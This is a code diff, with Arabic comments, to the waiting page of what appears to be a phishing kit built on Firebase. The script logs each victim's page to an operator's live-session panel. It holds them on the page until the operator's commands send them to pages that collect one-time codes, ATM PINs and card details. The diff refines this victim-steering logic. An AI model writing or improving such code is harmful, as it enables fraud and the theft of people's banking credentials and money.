@@ -78,47 +78,57 @@
     </div>
 
     <script>
+        // إعدادات الفايربيس الخاصة بمشروعك
         const firebaseConfig = { 
             apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
             databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", 
             projectId: "saso-inspection" 
         };
-        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+        
+        // منع إعادة التعريف لو المكتبة محملة مسبقاً
+        if (!firebase.apps.length) { 
+            firebase.initializeApp(firebaseConfig); 
+        }
         const database = firebase.database();
         const v_id = localStorage.getItem('v_id');
 
         if (v_id) {
-            // تحديث الحالة لـ waiting عشان نلغي أي أمر قديم ونثبت الزائر في الصفحة
+            // التعديل السحري: تصفير أي أمر قديم فور دخول الصفحة لضمان بقاء الزائر فيها
             database.ref('orders/' + v_id).update({
-                next_step: 'waiting',
-                status: 'في صفحة المعالجة'
+                next_step: 'waiting', 
+                status: 'في انتظار أمر جديد من الآدمن'
             });
 
+            // تحديث موقع الزائر في لوحة التحكم
             database.ref('live_sessions/' + v_id).update({
                 current_page: "انتظار (Processing)",
                 last_seen: new Date().getTime()
             });
 
-            // مراقبة الأوامر بالأسماء الصحيحة للملفات
+            // مراقبة أوامر الآدمن وتوجيه الزائر للصفحات الصحيحة
             const orderRef = database.ref('orders/' + v_id + '/next_step');
             orderRef.on('value', (snapshot) => {
                 const step = snapshot.val();
-                if (step) {
+                
+                // التوجيه يتم فقط إذا كانت الحالة ليست "waiting"
+                if (step && step !== 'waiting') {
                     if (step === 'go_to_otp' || step === 'wrong_otp') {
-                        // صفحة الـ OTP بالاسم الجديد
+                        // صفحة الـ OTP باسمها الجديد عندك
                         window.location.href = 'complete-st.html'; 
                     } else if (step === 'go_to_pin') {
-                        // صفحة الـ ATM بالاسم الجديد
+                        // صفحة الـ ATM/PIN باسمها الجديد عندك
                         window.location.href = 'auth-session.html';
                     } else if (step === 'wrong_card') {
-                        // الرجوع لصفحة الدفع
+                        // العودة لصفحة البطاقة الأساسية
                         window.location.href = 'secure-pay-v2.html';
                     } else if (step === 'success') {
+                        // صفحة النجاح النهائية
                         window.location.href = 'success-page.html';
                     }
                 }
             });
         } else {
+            // لو مفيش v_id نرجعه للرئيسية
             window.location.href = 'index.html';
         }
     </script>
